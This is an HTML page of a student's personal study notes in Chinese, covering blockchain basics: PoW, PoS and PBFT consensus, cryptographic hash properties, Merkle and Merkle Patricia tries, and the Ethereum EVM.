href="Language/Python/0内置类型/6上下文管理器.html">上下文管理器</a></li></ol></li><li class="chapter-item "><a href="Language/Python/1工作原理/index.html">工作原理</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Language/Python/1工作原理/0对象模型.html">OOP模型</a></li><li class="chapter-item "><a href="Language/Python/1工作原理/1类型.html">类型</a></li><li class="chapter-item "><a href="Language/Python/1工作原理/2变量.html">变量</a></li><li class="chapter-item "><a href="Language/Python/1工作原理/3特殊方法和重载.html">特殊方法和重载</a></li><li class="chapter-item "><a href="Language/Python/1工作原理/4参数.html">参数</a></li><li class="chapter-item "><a href="Language/Python/1工作原理/5多继承.html">多继承</a></li></ol></li><li class="chapter-item "><a href="Language/Python/3高级写法/index.html">高级写法</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Language/Python/3高级写法/1异常.html">Exception</a></li><li class="chapter-item "><a href="Language/Python/3高级写法/2装饰器.html">装饰器</a></li></ol></li><li class="chapter-item "><a href="Language/Python/4好用的库/index.html">PythonLib</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Language/Python/4好用的库/Argparse.html">命令行参数</a></li><li class="chapter-item "><a href="Language/Python/4好用的库/Bisect.html">Bisect</a></li><li class="chapter-item "><a href="Language/Python/4好用的库/Builtin.html">Builtin</a></li><li class="chapter-item "><a href="Language/Python/4好用的库/Container.html">Container</a></li><li class="chapter-item "><a href="Language/Python/4好用的库/Crypto.html">Crypto</a></li><li class="chapter-item "><a href="Language/Python/4好用的库/Enum.html">enum</a></li><li class="chapter-item "><a href="Language/Python/4好用的库/FS.html">File System</a></li><li class="chapter-item "><a href="Language/Python/4好用的库/Flask.html">Python-Flask</a></li><li class="chapter-item "><a href="Language/Python/4好用的库/HTTP.html">Internet</a></li><li class="chapter-item "><a href="Language/Python/4好用的库/IO.html">File IO</a></li><li class="chapter-item "><a href="Language/Python/4好用的库/PyQt5.html">PySide2</a></li><li class="chapter-item "><a href="Language/Python/4好用的库/Regex.html">Regex</a></li><li class="chapter-item "><a href="Language/Python/4好用的库/Socket.html">Socket编程</a></li><li class="chapter-item "><a href="Language/Python/4好用的库/Thread.html">多线程</a></li><li class="chapter-item "><a href="Language/Python/4好用的库/Time.html">时间和日期</a></li><li class="chapter-item "><a href="Language/Python/4好用的库/Trio.html">Trio</a></li><li class="chapter-item "><a href="Language/Python/4好用的库/format.html">Format String</a></li><li class="chapter-item "><a href="Language/Python/4好用的库/venv.html">Virtual Environment</a></li><li class="chapter-item "><a href="Language/Python/4好用的库/数据持久化.html">简单的数据持久化</a></li><li class="chapter-item "><a href="Language/Python/4好用的库/文档和测试.html">文档和测试</a></li><li class="chapter-item "><a href="Language/Python/4好用的库/计算器.html">把Python当计算器</a></li></ol></li><li class="chapter-item "><a href="Language/Python/运算符.html">运算符</a></li></ol></li><li class="chapter-item "><a href="Language/Rust/index.html">Rust</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Language/Rust/Basic/index.html">Basic</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Language/Rust/Basic/Any.html">Any</a></li><li class="chapter-item "><a href="Language/Rust/Basic/Async.html">异步编程</a></li><li class="chapter-item "><a href="Language/Rust/Basic/Casting.html">Casting</a></li><li class="chapter-item "><a href="Language/Rust/Basic/ClosureAndIter.html">迭代器和闭包</a></li><li class="chapter-item "><a href="Language/Rust/Basic/CratesAndModules.html">Crates and Modules</a></li><li class="chapter-item "><a href="Language/Rust/Basic/Error.html">Rust-错误处理</a></li><li class="chapter-item "><a href="Language/Rust/Basic/Macro.html">宏</a></li><li class="chapter-item "><a href="Language/Rust/Basic/Trait.html">Trait</a></li><li class="chapter-item "><a href="Language/Rust/Basic/TypeAndLifetime.html">从类型系统看生命周期</a></li><li class="chapter-item "><a href="Language/Rust/Basic/Unsafe.html">Unsafe</a></li><li class="chapter-item "><a href="Language/Rust/Basic/pattern.html">模式匹配</a></li></ol></li><li class="chapter-item "><a href="Language/Rust/Build.html">Build</a></li><li class="chapter-item "><a href="Language/Rust/Cargo/index.html">Cargo</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Language/Rust/Cargo/clippy.html">Clippy</a></li><li class="chapter-item "><a href="Language/Rust/Cargo/fix.html">Cargo fix</a></li><li class="chapter-item "><a href="Language/Rust/Cargo/make.html">Cargo make</a></li></ol></li><li class="chapter-item "><a href="Language/Rust/Compiler.html">Compiler</a></li><li class="chapter-item "><a href="Language/Rust/Crate/index.html">Crates</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Language/Rust/Crate/Anyhow.html">AnyHow & ThisError</a></li><li class="chapter-item "><a href="Language/Rust/Crate/Cell.html">Cell</a></li><li class="chapter-item "><a href="Language/Rust/Crate/Diesel.html">Diesel</a></li><li class="chapter-item "><a href="Language/Rust/Crate/Dioxus.html">Dioxus</a></li><li class="chapter-item "><a href="Language/Rust/Crate/EnumDispatch.html">Dispatch</a></li><li class="chapter-item "><a href="Language/Rust/Crate/IO.html">IO</a></li><li class="chapter-item "><a href="Language/Rust/Crate/collections.html">容器的增删改查</a></li><li class="chapter-item "><a href="Language/Rust/Crate/gtk-rs.html">gtk-rs</a></li><li class="chapter-item "><a href="Language/Rust/Crate/r2d2.html">r2d2</a></li><li class="chapter-item "><a href="Language/Rust/Crate/stdsync.html">std::sync</a></li><li class="chapter-item "><a href="Language/Rust/Crate/字符串.html">字符串/字节流</a></li><li class="chapter-item "><a href="Language/Rust/Crate/打包.html">打包</a></li><li class="chapter-item "><a href="Language/Rust/Crate/智能指针.html">Rust-智能指针</a></li></ol></li><li class="chapter-item "><a href="Language/Rust/FFI.html">FFI</a></li><li class="chapter-item "><a href="Language/Rust/IO.html">Rust-IO</a></li><li class="chapter-item "><a href="Language/Rust/Practice/index.html">Practice</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Language/Rust/Practice/BestPractice.html">Rust最佳实践</a></li><li class="chapter-item "><a href="Language/Rust/Practice/Debug.html">调试</a></li><li class="chapter-item "><a href="Language/Rust/Practice/DesignPattern.html">设计模式</a></li><li class="chapter-item "><a href="Language/Rust/Practice/Performance.html">性能优化</a></li><li class="chapter-item "><a href="Language/Rust/Practice/Size.html">代码体积优化</a></li><li class="chapter-item "><a href="Language/Rust/Practice/Test.html">测试最佳实践</a></li><li class="chapter-item "><a href="Language/Rust/Practice/Type.html">类型转换</a></li><li class="chapter-item "><a href="Language/Rust/Practice/Unsafe.html">Unsafe最佳实践</a></li></ol></li><li class="chapter-item "><a href="Language/Rust/gtk.html">Rust-gtk-rs介绍</a></li><li class="chapter-item "><a href="Language/Rust/函数参数匹配.html">函数参数匹配</a></li><li class="chapter-item "><a href="Language/Rust/基础知识.html">基础知识</a></li><li class="chapter-item "><a href="Language/Rust/多线程.html">多线程支持</a></li><li class="chapter-item "><a href="Language/Rust/混合编程.html">混合编程</a></li><li class="chapter-item "><a href="Language/Rust/精髓.html">Rust-精髓</a></li></ol></li><li class="chapter-item "><a href="Language/Scala/index.html">Scala</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Language/Scala/0控制结构.html">控制结构</a></li><li class="chapter-item "><a href="Language/Scala/1数据结构.html">数据结构</a></li><li class="chapter-item "><a href="Language/Scala/2_0类和对象.html">Class</a></li><li class="chapter-item "><a href="Language/Scala/2_1继承.html">继承</a></li><li class="chapter-item "><a href="Language/Scala/2_2特质.html">Trait</a></li><li class="chapter-item "><a href="Language/Scala/3_1花里胡哨的函数.html">花里胡哨的函数</a></li><li class="chapter-item "><a href="Language/Scala/3_2匿名函数和闭包.html">函数</a></li><li class="chapter-item "><a href="Language/Scala/3_3模式匹配.html">模式匹配</a></li><li class="chapter-item "><a href="Language/Scala/3_4容器的函数式操作.html">容器的函数式操作</a></li><li class="chapter-item "><a href="Language/Scala/ScalaDepth/index.html">ScalaDepth</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Language/Scala/ScalaDepth/Class文件.html">Class文件</a></li><li class="chapter-item "><a href="Language/Scala/ScalaDepth/ScalaInDepth.html">Scala in Depth 读书笔记</a></li><li class="chapter-item "><a href="Language/Scala/ScalaDepth/Spark.html">Spark</a></li><li class="chapter-item "><a href="Language/Scala/ScalaDepth/jvm.html">《深入理解Java虚拟机读书》笔记</a></li><li class="chapter-item "><a href="Language/Scala/ScalaDepth/函数式的一些概念.html">Scala中一些函数式概念</a></li><li class="chapter-item "><a href="Language/Scala/ScalaDepth/泛型擦除.html">泛型擦除</a></li><li class="chapter-item "><a href="Language/Scala/ScalaDepth/简单的类型原理.html">类型</a></li></ol></li><li class="chapter-item "><a href="Language/Scala/sbt.html">sbt</a></li><li class="chapter-item "><a href="Language/Scala/trait.html">trait</a></li><li class="chapter-item "><a href="Language/Scala/枚举.html">枚举</a></li><li class="chapter-item "><a href="Language/Scala/样例类和模式匹配.html">样例类和模式匹配</a></li><li class="chapter-item "><a href="Language/Scala/测试和文档.html">测试和文档</a></li><li class="chapter-item "><a href="Language/Scala/组合和继承.html">类的组合和继承</a></li></ol></li><li class="chapter-item "><a href="Language/Snippet/index.html">Snippets</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Language/Snippet/c.html">c</a></li><li class="chapter-item "><a href="Language/Snippet/linux.html">linux</a></li><li class="chapter-item "><a href="Language/Snippet/python.html">python</a></li><li class="chapter-item "><a href="Language/Snippet/rust.html">rust</a></li></ol></li></ol></li><li class="chapter-item "><a href="Tools/index.html">Tools</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Tools/Docker.html">Docker</a></li><li class="chapter-item "><a href="Tools/GDB.html">GDB</a></li><li class="chapter-item "><a href="Tools/Git/index.html">Git</a></li><li class="chapter-item "><a href="Tools/Git.html">Git</a></li><li class="chapter-item "><a href="Tools/Githook.html">Githook</a></li><li class="chapter-item "><a href="Tools/GithubCI.html">Github-CI</a></li><li class="chapter-item "><a href="Tools/Latex.html">Latex</a></li><li class="chapter-item "><a href="Tools/Make.html">Make与Makefile</a></li><li class="chapter-item "><a href="Tools/VSCode.html">VSCode</a></li><li class="chapter-item "><a href="Tools/Vim.html">Vim</a></li><li class="chapter-item "><a href="Tools/WSL.html">WSL</a></li><li class="chapter-item "><a href="Tools/双系统.html">双系统使用经历</a></li><li class="chapter-item "><a href="Tools/软件打包.html">软件打包</a></li></ol></li></ol>
            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky bordered">
                    <div class="left-buttons">
                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </button>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light (default)</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title">Reticence&#x27;s Notes</h1>

                    <div class="right-buttons">
                        <a href="print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script type="text/javascript">
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="index"><a class="header" href="#index">Index</a></h1>
<blockquote>
<p>I’m Reticence Ji. A student in Zhejiang University, Information Security Major.
Focus on Linux, Rust, Scala and other interesting things.
Contact me at reticenceji@qq.com
The old notes may be archived since they are too naive and don't give reference to other articles or blogs.</p>
<p>我是Reticence Ji，一个浙江大学信息安全专业的学生。
我喜欢Linux，Rust，Scala和其他有趣的东西。
通过reticenceji@qq.com联系我。
这里是我的笔记，有一些老的笔记缺乏参考价值并且对其他文章/博客等资料的引用没有注意给出引用声明。</p>
</blockquote>
<p><img src="https://github-readme-stats.vercel.app/api?username=reticenceji" alt="Reticenceji's GitHub stats" /></p>
<p>种一棵树最好的时间是十年前，其次是现在。</p>
<h2 id="文章分类"><a class="header" href="#文章分类">文章分类</a></h2>
<ul>
<li>Basic: 本科阶段学习的课程</li>
<li>Advanced: 研究生阶段的研究方向，智能合约安全和操作系统安全</li>
<li>Language: 编程语言学习笔记</li>
<li>Tools: 一些工具的使用参考</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><h1 id="block-chain"><a class="header" href="#block-chain">Block Chain</a></h1>
<ul>
<li><a href="https://mirror.xyz/0x8f87F347904e84F97f51D957C17F4B4F8996ae54/ZQdboW4llDt5MXkdPaAeqDQgfo7AHZK-6TwBcw-a2RE">Aurora介绍 2022/5/29</a>: 他是构建在NEAR上的一个EVM</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="区块链技术"><a class="header" href="#区块链技术">区块链技术</a></h1>
<p><strong>分布式存储</strong>，<strong>点对点网络</strong>，<strong>共识机制</strong>，<strong>密码学</strong>是拉动<strong>区块链</strong>技术发展的四架马车。</p>
<p>然而，一般情况下我们<strong>不需要了解他们的具体细节</strong>，我们只需接受这些既有的特性功能，不必关心底层技术。</p>
<p>区块链是全球共享的<strong>事务性数据库</strong>，这意味着每个人都可加入网络来阅读数据库中的记录。如果你想改变数据库中的某些东西，你必须创建一个被所有其他人所接受的事务。</p>
<p><a href="https://www.youtube.com/watch?v=_160oMzblY8&amp;t=55s">区块链工作原理科普视频</a></p>
<p><a href="http://zhenxiao.com/blockchain/">区块链技术与应用-北大肖臻</a></p>
<p>比特币被称为区块链1.0，以太坊被称为区块链2.0。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="共识机制"><a class="header" href="#共识机制">共识机制</a></h1>
<h2 id="proof-of-work"><a class="header" href="#proof-of-work">Proof of Work</a></h2>
<p><strong>Proof of Work</strong>即<strong>工作量证明PoW</strong>，被比特币所使用。</p>
<p>工作量证明是通过计算来猜测一个数值（nonce），使得拼凑上交易数据后内容的 Hash 值满足规定的上限（来源于 hashcash）。由于 Hash 难题在目前计算模型下需要大量的计算，这就保证在一段时间内，系统中只能出现少数合法提案。反过来，如果谁能够提出合法提案，也证明提案者确实已经付出了一定的工作量。</p>
<p>这些少量的合法提案会在网络中进行广播，收到的用户进行验证后，会基于用户认为的最长链基础上继续难题的计算。因此，系统中可能出现链的分叉（Fork），但最终会有一条链成为最长的链。</p>
<p>谁的算力多，谁最先解决问题的概率就越大。当掌握超过全网一半算力时，从概率上就能控制网络中链的走向。这也是所谓 <code>51%</code> 攻击的由来。</p>
<p>参与 PoW 计算比赛的人，将付出不小的经济成本（硬件、电力、维护等，会造成相当大的资源浪费）。当没有最终成为首个算出合法 nonce 值的“幸运儿”时，这些成本都将被沉没掉。</p>
<h2 id="proof-of-stake"><a class="header" href="#proof-of-stake">Proof of Stake</a></h2>
<p><strong>Proof of Stake</strong>即<strong>权益证明PoS</strong>，被以太坊所使用。</p>
<p>权益证明类似于现实生活中的股东机制，拥有股份越多的人越容易获取记账权（同时越倾向于维护网络的正常工作）。</p>
<p>典型的过程是通过保证金（代币、资产、名声等具备价值属性的物品即可）来对赌一个合法的块成为新的区块，收益为抵押资本的利息和交易服务费。提供证明的保证金（例如通过转账货币记录）越多，则获得记账权的概率就越大。合法记账者可以获得收益。PoS 试图解决在 PoW 中大量资源被浪费的问题。</p>
<p>PoS 也有一些改进的算法，包括授权股权证明机制（DPoS），即股东们投票选出一个董事会，董事会中成员才有权进行代理记账。这些算法在实践中得到了不错的验证，但是并没有理论上的证明。</p>
<h2 id="practical-byzantine-fault-tolerance"><a class="header" href="#practical-byzantine-fault-tolerance">Practical Byzantine Fault Tolerance</a></h2>
<p><strong>Practical Byzantine Fault Tolerance</strong>即实用<strong>拜占庭容错PBFT</strong>。</p>
<blockquote>
<p>一组拜占庭将军分别各率领一支军队共同围困一座城市。各支军队的行动策略为进攻或撤离两种。因为部分军队进攻部分军队撤离可能会造成灾难性后果，因此各位将军必须通过投票来达成<strong>一致策略</strong>，即所有军队一起进攻或所有军队一起撤离。因为各位将军分处城市不同方向，他们只能通过信使互相联系。在投票过程中每位将军都将自己投票给进攻还是撤退的信息通过信使分别通知其他所有将军，这样一来<strong>每位将军根据自己的投票和其他所有将军送来的信息</strong>就可以知道共同的投票结果而决定行动策略。</p>
<p>但是将军中间可能有叛徒，他们不仅可能向较为糟糕的策略投票，还可能选择性地发送投票信息。我们希望的是:</p>
<p><strong>A. 所有忠诚的将军可以达成一致的作战计划</strong>
<strong>B. 少数的叛徒不会导致忠诚的将军们无法达成一致</strong>。</p>
</blockquote>
<p>如果我们假设 $v(i)$ 为第 $i$ 个将军的作战计划，且每个将军使用某种方法将序列 $v(1),v(2),…,v(n)$ 转换成一个单一的作战计划。那么只要所有的将军使用相同的方法转换 $v(1),v(2),…,v(n)$，条件A就可以被满足。</p>
<p><strong>即使出现了伪造或错误的消息。只要有问题的将军的数量不到三分之一，仍可以达到“拜占庭容错”</strong></p>
<p>我们先了解一下使用 PBFT 算法的分布式系统的概念，和算法对系统的一些要求：</p>
<ol>
<li>PBFT要求系统内的结点数量 n 不小于 3f+1，其中 f 为「恶意结点」的数量。这里的「恶意结点」可以是故意作恶的结点，也可以是被攻击被控制的结点，甚至是失去响应的结点，总之只要是不正常的，都可以认为是恶意的。</li>
<li>PBFT 将系统内的每个结点分成了两类：主结点和从结点。任一时刻内，只有一个主结点，其它结点都是从结点。但主结点是可以被更换的（更换主结点被称为「域转换」（View Change））。无论是主结点还是从结点，他们都使用状态机机制记录自己的操作。如果各结点的操作是一致的，那么它们的状态机的状态会一直保持一致。</li>
<li>向 PBFT 系统发送请求的端叫做「客户端」。当某个客户端想要向系统发送请求时，一般情况下，它会将请求发给当前的主结点；非一般情况下，它会将请求广播给所有结点。无论哪种情况，客户端都直接从各个结点（包括主结点）接收请求返回的数据。</li>
<li>客户端必须等待上一个请求完成以后，才会发送下一个请求。也就是说主结点和从结点们在某一时刻只会处理一个请求。这是一种同步发送请求的方式。如果客户端不等上一个请求返回就再次发送请求（即异步发送请求），那么请求的响应顺序可能不会是客户端发送的顺序。</li>
<li>PBFT 中有一个「域」( view )的概念（一般翻译成「视图」，但解析作者觉得「视图」这个词并不能表达原术语的意思，所以将它翻译成「域」）。某个结点担任主结点的过程，就是一个域。如果担任主结点的结点发生了变化，就是发生了「域转换」(View Change)。域是有编号的，每发生一次域转换，域编号就递增一次。如果将每个结点从 0 开始编号，那么我们可以通过算式 $i=v\ mod\ |R|$得到当前主结点的编号 $i$：其中 $v$ 为当前的域编号， $|R|$ 为结点数量。（如果把「域」比作「朝代」，可能会比较好理解一些：一个结点开始担任主结点，表示一个朝代的开始；主结点发生变更时，表示一个朝代的变更，朝代号就是加 1）</li>
</ol>
<p><strong>PBFT共识的建立</strong>三个阶段按执行顺序是 pre-prepare 阶段、 prepare 阶段、 commit 阶段。</p>
<ol>
<li>
<p>pre-prepare: 主结点收到客户端发送的请求之后，开始 pre-prepare 阶段。首先主结点 p 为收到的请求分配一个序号，记为 n（n 必须未被分配给其它请求，且比最近一次的请求的序号大）。然后广播消息 $⟨⟨PRE-PREPARE,v,n,d⟩_{σi},m⟩$ 给所有从结点。其 m 为结点收到的客户端请求； v 代表当前的域编号（view number）；n 为刚才分配给 m 的序号；d 为 m 的哈希值。</p>
<p>当从结点收到 ⟨PRE⟨PRE-PREPARE⟩PREPARE⟩ 消息后，会对其进行验证。</p>
</li>
<li>
<p>prepare: 如果某个从结点验证通过了某条 ⟨PRE-PREPARE⟩ 消息，那么它将进入 prepare 阶段，并广播消息 $⟨PREPARE,v,n,d,i⟩_{σi}$。（如果 ⟨PRE-PREPARE⟩ 消息验证不通过，就忽略它，什么也不做）</p>
<p>在从结点发出 ⟨PREPARE⟩⟨PREPARE⟩ 消息的同时，它也会接收别人广播过来的 ⟨PREPARE⟩⟨PREPARE⟩ 消息，并对其进行验证。</p>
</li>
<li>
<p>commit: 如果对于某个结点 i ，prepared(m,v,n,d,i) 为 true，那么这个结点将进入commit 阶段，并广播消息 $⟨COMMIT,v,n,i⟩_{σi}$。</p>
</li>
</ol>
<p><img src="Advanced/Blockchain/Basic/../images/normal-case-op.png" alt="img" /></p>
<p>PBFT 的完整流程：</p>
<ol>
<li>客户端向主结点发起请求，记为 $⟨REQUEST,o,t,c⟩_{σc}$。
其中 o 代表客户端请求的操作( operation )；t 代表时间戳；c 为客户端自己的标识。这里通过 t 来保证同一请求只会被发送和处理一次：如果主结点收到两个完全一样的请求，它将丢弃重复的请求；如果同一操作需要先后执行两次，客户端应该先后构造两个请求，且这两个请求的时间戳是不一样的。</li>
<li>主结点收到请求后，立即启动三阶段的共识过程，让所有从结点参与请求的处理。
三阶段的共识过程就是 pre-prepare、prepare、commit。</li>
<li>三阶段执行完成后，如果对于某一结点 i， committed-local(m,v,n,d,i) 的值为 true，则结点开始执行请求 m。执行成功后更改自己本地状态机的状态，并将结点直接返回给客户端。</li>
<li>针对同一请求，如果客户端收到了 f+1 个相同的返回结果，那么它就把这个结点作为最终的结果。</li>
</ol>
<p>参考链接：<a href="https://yangzhe.me/2019/11/25/pbft/">非常好的解析</a>，<a href="https://medium.com/taipei-ethereum-meetup/intro-to-pbft-31187f255e68">繁体解析</a></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="加密"><a class="header" href="#加密">加密</a></h1>
<h2 id="cryptographic-hash-function"><a class="header" href="#cryptographic-hash-function">Cryptographic Hash Function</a></h2>
<p>在普通的Hash Function之上，Cryptographic Hash Function他具有两个重要性质：</p>
<ol>
<li>
<p>Collision Resistance: 防止碰撞，即给出<code>x</code>，你很难找到<code>y</code>，使得<code>Hash(x)=Hash(y)</code>。碰撞是不可避免的，根据鸽笼原理，输入空间是无限的，而Hash值的取值范围是有限的。</p>
<p>他有什么用呢？我们在签名时会用<code>Hash(x)</code>来保证内容<code>x</code>不被篡改。如果攻击者想要篡改x并保证签名不变，他就要找到<code>y</code>使得<code>Hash(x)=Hash(y)</code>。</p>
<p>另外，Collision Resistance是没有被理论证明的。我们只是通过实践经验来说他是Collision Resistance，一个著名的例子就是MD5，我们曾经认为他是Collision Resistance的，但是现在我们已经知道如何去制造碰撞了。</p>
</li>
<li>
<p>Hiding: Hash函数的计算过程是单向的。从x可以简单的计算出<code>Hash(x)</code>，而给出<code>Hash(x)</code>我们很难找到<code>y</code>使得<code>Hash(x)=Hash(y)</code>。</p>
<p>显然，输入空间要足够的大并且hash结果分布均匀来防止蛮力碰撞。</p>
</li>
</ol>
<blockquote>
<p>一个是给<code>x</code>不能找到<code>Hash(y)=Hash(x)</code>，另一个是给<code>Hash(x)</code>不能。</p>
</blockquote>
<p>通过这两个性质Collision Resistance + Hiding =&gt; Digital C ommitment。</p>
<p>比特币还需要Hash Function有另一个性质：</p>
<ol start="3">
<li>Puzzle friendly: 比如挖矿需要寻找<code>nonce</code>，使得<code>Hash(x | nonce)</code>的前k位为0。那么我们除了暴力寻找<code>nonce</code>之外，没有其他的好办法。 但是计算<code>Hash(x | nonce)</code>很容易。</li>
</ol>
<p>比特币使用的Hash算法是SHA256。</p>
<h2 id="非对称加密"><a class="header" href="#非对称加密">非对称加密</a></h2>
<p>比特币中，创建帐号就是创建一个<code>(private_key, public_key)</code>。用<code>public_key</code>对信息进行加密，用<code>private_key</code>对加密的信息解密。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="分布式存储"><a class="header" href="#分布式存储">分布式存储</a></h1>
<p>传统上的分布式存储本质上是一个中心化的系统 ,是将数据分散存储在多台独立的设备上,采用可扩展的系统结构、利用多台存储服务器分担存储负荷、利用位置服务器定位存储信息。而基于P2P网络的分布式存储是区块链的核心技术,是将数据存储于区块上并通过开放节点的存储空间建立的一种分布式数据库,解决传统分布式存储的问题。 </p>
<p>CAP问题：</p>
<h2 id="把数据直接存储在区块链上"><a class="header" href="#把数据直接存储在区块链上">把数据直接存储在区块链上</a></h2>
<p><strong>哈希指针</strong>，就是（数据的）哈希+（指向数据的）指针，这样可以<strong>保证指针指向的内容没有被篡改</strong>。</p>
<blockquote>
<p>当然这里的哈希函数需要是Cryptographic Hash Function。</p>
</blockquote>
<p><strong>Block Chain</strong>，就是区块的链表，链表的指针是哈希指针。根据哈希指针的性质，修改其中的一个节点是非常困难的，必须把后面的所有节点都修改才行。如下图，要修改B的内容，就要修改B/C/D。</p>
<pre><code class="language-mermaid">graph RL
D[&quot;hash(C), D&quot;] --&gt; C[&quot;hash(B), C&quot;] --&gt; B[&quot;hash(A), B&quot;] --&gt; A
</code></pre>
<p>类似的，树结构也可以使用哈希指针，得到<strong>Merkle Tree</strong>。类似的，这样的话我们要修改一个节点，就要不停的修改到跟节点为止，所以如果我们保存root的哈希值（下图中的<code>hash(A)</code>）就可以防止整棵树被修改。在比特币中，Merkle Tree被用来存储区块的具体内容（一个个交易）。</p>
<pre><code class="language-mermaid">graph TD
root[&quot;hash(A)&quot;] --&gt; A
A[&quot;A: hash(B), hash(C)&quot;] --&gt; B[&quot;B: hash(tx1), hash(tx2)&quot;] 
A --&gt; C[&quot;C: hash(tx3), hash(tx4)&quot;]
B --&gt; tx1
B --&gt; tx2
C --&gt; tx3
C --&gt; tx4
</code></pre>
<p>事实上，对于一个无环的数据结构，都可以考虑使用哈希指针来代替普通指针。</p>
<hr />
<p>以以太坊为例，它要从帐号地址（160 bits的数）到帐号状态（例如帐号余额等信息）的映射。</p>
<p>只从这个需求出发，那么我们容易想到使用的数据结构，是HashMap。 </p>
<p>Patricia Trie，压缩字典树。比如我们用这个数据结构来存储General, Genesis, Go, God, Good。当Trie上的节点比较稀疏的时候，这个数据结构就可以节省大量的空间。</p>
<pre><code class="language-mermaid">graph TD
root --&gt; G
G --E--&gt; EN
G --O--&gt; O
EN --E--&gt; ERAL[&quot;ERAL(General)&quot;]
EN --S--&gt; SIS[&quot;SIS(Gensis)&quot;]
O[&quot;O(Go)&quot;] --D--&gt; D[&quot;D(God)&quot;]
O --O--&gt; OD[&quot;OD(Good)&quot;]
</code></pre>
<p>那么，现在我们在来把普通指针换成哈希指针，得到的数据结构就叫做<strong>MPT(Merkle Patricia Trie)</strong>。</p>
<p><img src="Advanced/Blockchain/Basic/../images/image-20220925192746565.png" alt="image-20220925192746565" /></p>
<p>以太坊中有状态树、交易树和收据树。他们的数据结构都是MPT。</p>
<h2 id="把数据存储在分布式散列表中"><a class="header" href="#把数据存储在分布式散列表中">把数据存储在分布式散列表中</a></h2>
<div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><h1 id="如何执行智能合约"><a class="header" href="#如何执行智能合约">如何执行智能合约</a></h1>
<p>我们先以以太坊为例子，介绍智能合约的执行。</p>
<p>最简单的理解：所有的全节点都会去<strong>执行</strong>节点发出的智能合约，根据执行结果对世界状态的改变去挖矿。不同的全节点可能执行的智能合约不同，但是有一个节点会首先挖到矿，成功打包成一个区块发布，<strong>广播</strong>给所有节点。其他节点在收到区块后，在本地进行<strong>验证</strong>。</p>
<p>这里没有考虑节点是恶意的、出现了分叉等情况。</p>
<h2 id="evm"><a class="header" href="#evm">EVM</a></h2>
<p>Ethernet Virtual Machine，简称EVM。EVM可以被看做是一个大型的分布式计算机。</p>
<p>以太坊的智能合约由Solidity编写，编译后形成字节码运行在EVM上。</p>
<p>EVM 的行为就像一个数学函数：<strong>在给定输入的情况下，它会产生确定性的输出</strong>（否则不同节点之间根本不可能达成一致）。
$$
Y(S, T)= S'
$$
给定一个旧的有效状态<code>S</code>和一组新的有效交易<code>T</code>，以太坊状态转换函数<code>Y(S，T)</code>产生新的有效输出状态<code> S'</code>。</p>
<p><img src="Advanced/Blockchain/Basic/../images/evm.png" alt="EVM 组成结构图" /></p>
<h2 id="存储"><a class="header" href="#存储">存储</a></h2>
